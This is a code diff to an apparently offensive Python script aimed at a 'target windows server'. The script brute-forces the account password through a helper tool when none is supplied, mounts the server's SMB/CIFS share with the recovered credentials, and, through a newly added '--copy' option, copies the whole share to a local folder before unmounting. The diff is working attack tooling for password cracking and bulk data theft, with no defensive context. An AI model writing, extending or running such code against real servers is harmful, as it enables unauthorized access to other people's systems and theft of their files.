@@ -21,10 +21,10 @@ def parseVulnerabilitiesFile(f):
 		
 	return mountpoints
 
-def performAttack(location, serverIP, username, password=None):
+def performAttack(location, serverIP, username, password=None, copy=False):
 	if (password is None):
 		f=open("password.txt", "w")
-		call(["python3", "hyd.py", "-u", username, "-p", "passwd.txt", "-i", serverIP], stdout=f)
+		call(["python3", "hyd.py", "-u", username, "-i", serverIP], stdout=f)
 		f.close()
 		f = open("password.txt", "r")
 		lines = f.readlines()
@@ -62,9 +62,17 @@ def performAttack(location, serverIP, username, password=None):
 	elif len(mountpoints) == 1:
 		os.mkdir(location)
 		mountpoint = mountpoints[0]
-		mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, location]
-		call(mountArgs)
-		print ("remote filesystem " + serverIP + "/" + mountpoint + " is mounted at " + location)
+		if copy:
+			mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, "./assets/tempMount"]
+			call(mountArgs)
+			copyMountFiles = ["cp", "-a", "./assets/tempMount/.", location]
+			call(copyMountFiles)
+			unMount = ["umount", "./assets/tempMount/"]
+			call(unMount)	
+		else:
+			mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, location]
+			call(mountArgs)
+			print ("remote filesystem " + serverIP + "/" + mountpoint + " is mounted at " + location)
 	else:
 		os.mkdir(location)
 		lastFolder = str.split(location, "/")
@@ -88,11 +96,14 @@ parser.add_argument('--mountloc', type=str, help="Enter the location to mount th
 parser.add_argument('--serverIP', type=str, help="Enter the name of the targer windows server")
 parser.add_argument('--username', type=str, help="Enter the username of the target windows server")
 parser.add_argument('--password', type=str, help="Optional. Enter the password of the target windows server. If not included, password will be brute forced.")
-
+parser.add_argument('--copy', type=str, help="Optional.  If set, the mount will create a copy of the target instead of actually mounting the filesystem on the remote target", required=False)
 
 args = parser.parse_args()
+copy = False
+if args.copy:
+	copy = True
 if args.password:
-	performAttack(args.mountloc, args.serverIP, args.username, args.password)
+	performAttack(args.mountloc, args.serverIP, args.username, args.password, copy=copy)
 else:
-	performAttack(args.mountloc, args.serverIP, args.username)
+	performAttack(args.mountloc, args.serverIP, args.username, copy=copy)
 
